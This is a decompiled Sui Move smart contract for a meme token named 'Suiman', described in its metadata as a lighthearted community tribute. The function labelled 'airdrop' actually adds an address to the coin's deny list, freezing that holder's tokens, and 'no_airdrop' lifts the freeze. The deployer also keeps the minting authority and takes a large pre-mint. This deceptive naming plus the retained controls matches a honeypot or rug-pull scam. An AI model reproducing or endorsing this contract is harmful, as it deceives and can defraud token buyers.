module 0x50e019e4a930303731ade834e3dbcde638744351b147f75abf7f1a65c616d456::suiman {
    struct SUIMAN has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIMAN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIMAN>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUIMAN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIMAN>(arg0, 9, b"suiman", b"Suiman", b"Suiman is a meme token on the Sui, combining the fun of superhero vibes with the power of the Sui blockchain. Powered by the community, it's a lighthearted tribute to crypto culture.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/4Ff8v5f/ava.png")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIMAN>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIMAN>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<SUIMAN>(&mut v3, 500000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::coin::mint_and_transfer<SUIMAN>(&mut v3, 166666666666666660, @0xe0e1fadbd5bc6c80bd8f0b8d0a880871fcebca4e41d9c64a26879c2df80a2903, arg1);
        0x2::coin::mint_and_transfer<SUIMAN>(&mut v3, 166666666666666660, @0xee8193cc4d3fb14b469910dade38918ba3d4f7a8c2e3b0b28aff7ecb5d217237, arg1);
        0x2::coin::mint_and_transfer<SUIMAN>(&mut v3, 166666666666666660, @0x1ab9d12adb0d5bc8d8cb85cc692b6907e038417a17f4041e1499c161cc4bcac6, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUIMAN>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIMAN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUIMAN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

